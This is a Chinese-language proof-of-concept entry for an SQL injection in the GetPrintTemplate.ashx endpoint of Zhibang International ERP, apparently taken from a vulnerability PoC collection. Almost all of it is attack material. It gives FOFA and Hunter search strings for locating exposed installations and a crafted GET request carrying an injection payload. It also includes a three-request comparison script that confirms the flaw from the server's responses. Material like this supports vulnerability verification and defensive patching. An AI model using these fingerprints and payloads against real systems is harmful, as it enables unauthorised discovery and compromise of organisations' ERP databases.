﻿# 智邦国际-GetPrintTemplate-SQL注入漏洞

> 更新时间：2024-04-22

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：fofa: body="/SYSN/" hunter: app.name="智邦国际 ERP"

> 验证脚本：HTTP

```
GET /SYSN/json/pcclient/GetPrintTemplate.ashx?ord=-99--+'&sort=1 HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：-99

> 上传文件定位：

> 验证文件来源：智邦国际-GetPrintTemplate-SQL注入漏洞.poc

```
进一步poc验证：
url1=baseurl+"SYSN/json/pcclient/GetPrintTemplate.ashx?ord=-99&sort=1"
url2=baseurl+"SYSN/json/pcclient/GetPrintTemplate.ashx?ord=-99'&sort=1"
url3=baseurl+"SYSN/json/pcclient/GetPrintTemplate.ashx?ord=-99--+'&sort=1"
response1.text={"sort":"1","ord":"-99","title":"合同打印模板","name":"","main":"","file":""}
response2.text=报错
response3.text={"sort":"1","ord":"-99-- '","title":"合同打印模板","name":"","main":"","file":""}

if response1.text==response3.text.replace("-99-- '",'-99') and response1.text!=response2.text.replace("-99'",'-99'):
   return True
```